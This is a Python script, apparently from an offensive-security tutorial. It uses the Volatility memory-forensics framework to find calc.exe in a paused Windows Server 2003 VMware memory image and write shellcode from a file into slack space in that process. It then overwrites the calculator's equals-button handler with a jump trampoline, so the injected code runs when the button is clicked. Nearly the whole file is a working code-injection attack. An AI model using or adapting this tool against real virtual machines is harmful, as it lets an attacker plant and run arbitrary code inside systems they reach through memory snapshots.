import sys
import struct
import volatility.conf as conf
import volatility.registry as registry
import volatility.commands as commands
import volatility.addrspace as addrspace
import volatility.plugins.taskmods as taskmods


TARGET_PROC_NAME = "calc.exe"
TARGET_VA_ADDR = 0x01005D51  # Address of the 'equals' button handler
SHELLCODE_FILE = "cmeasure.bin"
MEMORY_IMAGE = "/Users/justin/Documents/Virtual Machines.localized/" \
               "Windows Server 2003 Standard Edition.vmwarevm/" \
               "564d9400-1cb2-63d6-722b-4ebe61759abd.vmem"
VOLATILITY_PATH = "/Downloads/volatility-2.3.1"
PROFILE = "Win2003SP2x86"


sys.path.append(VOLATILITY_PATH)
registry.PluginImporter()
config = conf.ConfObject()

registry.register_global_options(config, commands.Command)
registry.register_global_options(config, addrspace.BaseAddressSpace)

config.parse_options()
config.PROFILE = PROFILE
config.LOCATION = f"file://{MEMORY_IMAGE}"

with open(SHELLCODE_FILE, "rb") as shell_fd:
    shellcode = shell_fd.read()


def locate_and_inject(process, shellcode):
    addr_space = process.get_process_address_space()
    memory_pages = addr_space.get_available_pages()
    
    slack_space_va = None
    trampoline_physical_offset = None

    with open(MEMORY_IMAGE, "r+b") as mem_fd:
        for va_base, page_len in memory_pages:
            physical_offset = addr_space.vtop(va_base)
            if physical_offset is None:
                continue

            mem_fd.seek(physical_offset)
            data = mem_fd.read(page_len)

            # Step 1: Locate free space (slack)
            if slack_space_va is None:
                try:
                    offset = data.index(b"\x00" * len(shellcode))
                    slack_space_va = va_base + offset
                    mem_fd.seek(physical_offset + offset)
                    mem_fd.write(shellcode)

                    print("[+] Found suitable slack space")
                    print(f"    Virtual Address: 0x{slack_space_va:08X}")
                    print(f"    Physical Address: 0x{physical_offset + offset:08X}")
                    print("[+] Shellcode injected")

                    # Prepare trampoline code: mov ebx, <VA>; jmp ebx
                    global trampoline_code
                    trampoline_code = b"\xBB" + struct.pack("<L", slack_space_va) + b"\xFF\xE3"

                except ValueError:
                    pass  # No slack space on this page

            # Step 2: Locate function address for trampoline patch
            if va_base <= TARGET_VA_ADDR < (va_base + page_len - 7):
                trampoline_physical_offset = physical_offset + (TARGET_VA_ADDR - va_base)
                print(f"[+] Found target function address at 0x{trampoline_physical_offset:08X}")

            if slack_space_va and trampoline_physical_offset:
                break

        # Final step: Inject trampoline
        if trampoline_physical_offset:
            mem_fd.seek(trampoline_physical_offset)
            mem_fd.write(trampoline_code)
            print("[+] Trampoline injected")

def main():
    task_list = taskmods.PSList(config)
    
    for proc in task_list.calculate():
        if str(proc.ImageFileName) == TARGET_PROC_NAME:
            print(f"[*] Located '{TARGET_PROC_NAME}' (PID: {proc.UniqueProcessId})")
            print("[*] Starting memory analysis and injection...")
            locate_and_inject(proc, shellcode)
            break
    else:
        print(f"[!] Target process '{TARGET_PROC_NAME}' not found.")

if __name__ == "__main__":
    main()
